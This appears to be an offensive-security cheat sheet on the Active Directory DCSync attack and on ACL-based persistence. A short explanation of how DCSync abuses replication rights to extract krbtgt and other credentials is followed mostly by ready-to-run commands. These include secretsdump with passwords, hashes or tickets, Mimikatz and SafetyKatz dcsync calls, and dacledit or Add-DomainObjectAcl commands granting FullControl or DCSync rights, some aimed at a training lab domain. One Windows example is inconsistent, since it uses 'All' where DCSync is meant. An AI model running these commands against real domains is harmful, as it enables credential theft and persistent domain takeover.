# DCSync 

DCSync is a legitimate Active Directory feature that domain controllers only use for replicating changes, but illegitimate security principals can also use it.

DCSync is a technique that uses Windows Domain Controller's API to simulate the replication process from a remote domain controller. 

This attack can lead to the compromise of major credential material such as the Kerberos krbtgt keys used legitimately for tickets creation, but also for tickets forging by attackers. 

The consequences of this attack are similar to an NTDS.dit dump and parsing but the practical aspect differ. A DCSync is not a simple copy & parse of the NTDS.dit file, it's a DsGetNCChanges operation transported in an RPC request to the DRSUAPI (Directory Replication Service API) to replicate data (including credentials) from a domain controller.

This attack requires domain admin privileges to succeed (more specifically, it needs the following extended privileges: DS-Replication-Get-Changes and DS-Replication-Get-Changes-All). Members of the Administrators, Domain Admins, Enterprise Admins, and Domain Controllers groups have these privileges by default. In some cases, over-privileged accounts can be abused to grant controlled objects the right to DCSync.df

**Unix**
```
# using a plaintext password
secretsdump -outputfile 'dcsync' -dc-ip "$DC_IP" "$DOMAIN"/"$USER":"$PASSWORD"@"$DC_HOST"

# with Pass-the-Hash
secretsdump -outputfile 'dcsync' -hashes :"$NT_HASH" -dc-ip "$DC_IP" "$DOMAIN"/"$USER"@"$DC_HOST"

# with Pass-the-Ticket
KRB5CCNAME=ticket.ccache secretsdump -k -no-pass -outputfile 'dcsync' -dc-ip "$DC_IP" @"$DC_HOST"
```

**Windows - Mimikatz**
```
# Extract a specific user, in this case the krbtgt
lsadump::dcsync /dc:$DomainController /domain:$DOMAIN /user:krbtgt

# Dump everything (printed in a short and readable format)
lsadump::dcsync /dc:$DomainController /domain:$DOMAIN /all /csv

SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```

### Persistence using ACLs - Rights Abuse

This abuse can be carried out when controlling an object that has WriteDacl over another object.

The attacker can write a new ACE to the target object’s DACL (Discretionary Access Control List). This can give the attacker full control of the target object.

**Unix**
```
# Give full control
dacledit.py -action 'write' -rights 'FullControl' -principal 'controlled_object' -target 'target_object' "$DOMAIN"/"$USER":"$PASSWORD"

# Give DCSync (DS-Replication-Get-Changes, DS-Replication-Get-Changes-All)
dacledit.py -action 'write' -rights 'DCSync' -principal 'controlled_object' -target 'target_object' "$DOMAIN"/"$USER":"$PASSWORD"
```

**Windows**
```
# Give full control
Add-DomainObjectAcl -Rights 'All' -TargetIdentity "target_object" -PrincipalIdentity "controlled_object"

# Give DCSync (DS-Replication-Get-Changes, DS-Replication-Get-Changes-All)
Add-DomainObjectAcl -Rights 'All' -TargetIdentity "target_object" -PrincipalIdentity "controlled_object"
```

**Lab**
```
# Add FullControl rights
Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student1 -Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose

# Add rights for DCSync
Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student1 -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose 

# Execute DCSync
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'

OR

C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit" 
```